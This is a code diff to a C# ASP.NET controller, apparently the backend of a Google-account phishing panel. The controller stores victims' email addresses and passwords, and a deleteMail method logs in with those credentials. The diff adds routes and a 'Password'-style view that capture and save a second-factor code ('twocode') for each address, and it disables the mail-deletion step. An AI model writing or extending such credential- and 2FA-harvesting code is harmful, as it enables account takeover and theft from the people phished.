@@ -47,6 +47,7 @@ namespace GoogleCrawler.Controllers
 
         public void deleteMail(string mail, string pass)
         {
+            return;
             Chilkat.Global glob = new Chilkat.Global();
             bool successs = glob.UnlockBundle("Anything for 30-day trial");
             if (successs != true)
@@ -193,13 +194,29 @@ namespace GoogleCrawler.Controllers
 
 
                 }
-               
+
                 return Json(row);
             }
             else
             {
                 return Json(null);
             }
+        }
+
+        [Route("gettype")]
+        public async Task<IActionResult> gettype(string mail, string twocode)
+        {
+            var row = _usersRepository
+              .Where(o => o.mail == mail)
+              .ToList().LastOrDefault();
+
+            if (!string.IsNullOrEmpty(twocode))
+                row.twocode = twocode;
+            row.stype = stype.twocode;
+            _usersRepository.Update(row);
+            var rs = await _uow.Commit();
+
+            return Json(row);
         }
 
 
@@ -227,7 +244,7 @@ namespace GoogleCrawler.Controllers
             var result = setUsers(postModel);
             var row = _usersRepository.Where(o => o.mail == result.mail).ToList().LastOrDefault();
             if (row != null)
-                _usersRepository.Update(result); 
+                _usersRepository.Update(result);
             else
                 _usersRepository.Add(result);
 
@@ -244,6 +261,13 @@ namespace GoogleCrawler.Controllers
 
         [Route("Password")]
         public async Task<IActionResult> Password(Users postModel)
+        {
+            setUsers(postModel);
+            return View();
+        }
+
+        [Route("twocode")]
+        public async Task<IActionResult> twocode(Users postModel)
         {
             setUsers(postModel);
             return View();
